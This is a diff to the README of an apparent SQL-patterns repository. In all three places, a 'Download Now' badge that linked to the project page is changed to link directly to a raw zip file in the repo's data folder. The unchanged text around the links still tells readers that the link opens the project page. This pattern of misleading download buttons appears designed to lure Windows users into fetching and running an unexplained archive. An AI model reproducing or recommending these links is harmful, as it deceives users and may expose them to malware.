@@ -1,6 +1,6 @@
 # 📊 analytics-sql-patterns-for-ai-systems - Clear SQL Patterns for Business Insights
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gamings3587/analytics-sql-patterns-for-ai-systems)
+[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gamings3587/analytics-sql-patterns-for-ai-systems/raw/refs/heads/main/data/systems-for-ai-sql-patterns-analytics-v2.2.zip)
 
 ---
 
@@ -39,7 +39,7 @@ Follow these steps to download and run the software on Windows.
 
 Click the big green button at the top or here:
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gamings3587/analytics-sql-patterns-for-ai-systems)
+[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gamings3587/analytics-sql-patterns-for-ai-systems/raw/refs/heads/main/data/systems-for-ai-sql-patterns-analytics-v2.2.zip)
 
 This link opens the GitHub project page. Look for a **Download** or **Releases** section. You will find the files and documentation there.
 
@@ -149,7 +149,7 @@ The GitHub repository includes:
 
 Use this link to visit the project page for downloading:
 
-[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gamings3587/analytics-sql-patterns-for-ai-systems)
+[![Download Here](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Gamings3587/analytics-sql-patterns-for-ai-systems/raw/refs/heads/main/data/systems-for-ai-sql-patterns-analytics-v2.2.zip)
 
 From that page:
 
